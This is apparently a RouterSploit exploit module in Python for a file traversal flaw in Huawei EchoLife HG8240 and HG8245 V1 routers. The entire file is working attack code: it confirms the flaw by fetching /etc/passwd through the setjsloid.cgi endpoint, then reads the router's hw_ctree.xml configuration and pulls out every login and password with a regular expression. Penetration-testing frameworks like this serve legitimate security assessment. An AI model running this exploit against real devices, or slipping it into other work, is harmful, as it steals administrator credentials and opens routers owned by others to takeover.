import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Huawei HG824* File Traversal",
        "description": "Module exploits Huawei HG824* File Traversal vulnerability which allows read any file on the device.",
        "authors": (
            "GH0st3rs",  # vulnerability discovery
            "GH0st3rs",  # routersploit module
        ),
        "references": ( ),
        "devices": (
            "Huawei EchoLife HG8240 V1",
            "Huawei EchoLife HG8245 V1",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    filename = OptString("/mnt/jffs2/hw_ctree.xml", "File to read from the filesystem")

    def run(self):
        if self.check():
            print_success("Target appears to be vulnerable.")

            response = self.http_request(
                method="GET",
                path=f"/setjsloid.cgi?RequestFile={self.filename}",
            )

            if response is None:
                print_error("Error with reading response")
                return

            if response.text:
                print_status(f"Reading file: {self.filename}")
                creds = re.findall(r'UserName="([\w]+?)" Password="([\w]+?)"', response.text)
                print_table(['Login', 'Password'], *creds)
            else:
                print_error("Exploit failed - empty response")

        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        filename = "/etc/passwd"

        response = self.http_request(
            method="GET",
            path="/setjsloid.cgi?RequestFile={}".format(filename)
        )

        if response and utils.detect_file_content(response.text, "/etc/passwd"):
            return True  # target is vulnerable

        return False  # target is not vulnerable
